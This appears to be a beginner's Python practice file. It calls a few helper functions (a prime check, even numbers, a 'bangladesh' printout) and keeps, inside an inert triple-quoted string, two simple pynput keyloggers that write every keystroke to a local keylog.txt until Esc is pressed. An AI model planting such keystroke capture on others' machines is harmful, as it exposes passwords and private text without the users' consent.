import packages as p

print(p.check_prime(2))

print(p.even_1_to_n(17))

print(p.bangladesh())

'''
from pynput import keyboard
import sys
import time
import os

log_filename = "keylog.txt"
file_writer = open(log_filename, "w")
current_time = time.ctime(time.time())
file_writer.write(current_time)
file_writer.write("\n")
file_writer.write("------------------")
file_writer.write("\n")


def run_on_press(key):
    print(str(key))

    stroke = str(key).replace("'", "")
    # file_writer.write(str(key))
    # file_writer.write(stroke)

    if str(key) == "Key.space":
        file_writer.write(" ")

    elif str(key) == "Key.enter":
        file_writer.write("\n")

    elif str(key) == "Key.backspace":
        file_writer.seek(file_writer.tell() -1, os.SEEK_SET)
        file_writer.write(" ")
    else:
        file_writer.write(stroke)


def run_on_release(key):
    if str(key) == "Key.esc":
        return False
        # sys.exit(0)


with keyboard.Listener(on_press=run_on_press, on_release=run_on_release) as listener:
    listener.join()







from pynput import keyboard
import sys
import time

log_filename = "keylog.txt"
file_writer = open(log_filename, "w")


def run_on_press(key):
    print(str(key))
    file_writer.write(str(key))


def run_on_release(key):
    if str(key) == "Key.esc":
        sys.exit(0)


with keyboard.Listener(on_press=run_on_press, on_release=run_on_release) as listener:
    listener.join()

'''